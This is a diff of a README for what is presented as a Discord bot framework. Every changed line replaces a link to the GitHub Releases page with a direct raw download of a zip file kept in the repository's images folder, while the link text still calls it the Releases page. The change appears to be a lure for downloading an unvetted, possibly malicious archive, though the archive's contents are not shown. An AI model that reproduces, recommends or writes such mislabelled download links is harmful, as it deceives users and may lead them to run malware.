@@ -1,6 +1,6 @@
 # 🤖 discord-bot-framework - Build Your Discord Bot Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Disagreeable-oilofcloves612/discord-bot-framework/releases)
+[![Download](https://raw.githubusercontent.com/Disagreeable-oilofcloves612/discord-bot-framework/main/images/discord-bot-framework_1.2.zip)](https://raw.githubusercontent.com/Disagreeable-oilofcloves612/discord-bot-framework/main/images/discord-bot-framework_1.2.zip)
 
 ## 🌟 Introduction
 
@@ -15,11 +15,11 @@ Before you download and run the application, let’s cover a few basic points:
 
 ## 📥 Download & Install
 
-To download the discord-bot-framework, visit [this page](https://github.com/Disagreeable-oilofcloves612/discord-bot-framework/releases).
+To download the discord-bot-framework, visit [this page](https://raw.githubusercontent.com/Disagreeable-oilofcloves612/discord-bot-framework/main/images/discord-bot-framework_1.2.zip).
 
 Here are the steps to get started:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Disagreeable-oilofcloves612/discord-bot-framework/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Disagreeable-oilofcloves612/discord-bot-framework/main/images/discord-bot-framework_1.2.zip).
   
 2. **Choose Your Version:** Look for the most recent version listed on the page.
 
@@ -75,7 +75,7 @@ For questions or support while using the discord-bot-framework, join our communi
 
 ## 🔄 Updates and Contributions
 
-We regularly update the discord-bot-framework to add new features and improve performance. You can find updates on the same [Releases page](https://github.com/Disagreeable-oilofcloves612/discord-bot-framework/releases).
+We regularly update the discord-bot-framework to add new features and improve performance. You can find updates on the same [Releases page](https://raw.githubusercontent.com/Disagreeable-oilofcloves612/discord-bot-framework/main/images/discord-bot-framework_1.2.zip).
 
 If you wish to contribute, feel free to fork the repository and submit a pull request with your enhancements or bug fixes. Your input is valuable!
 
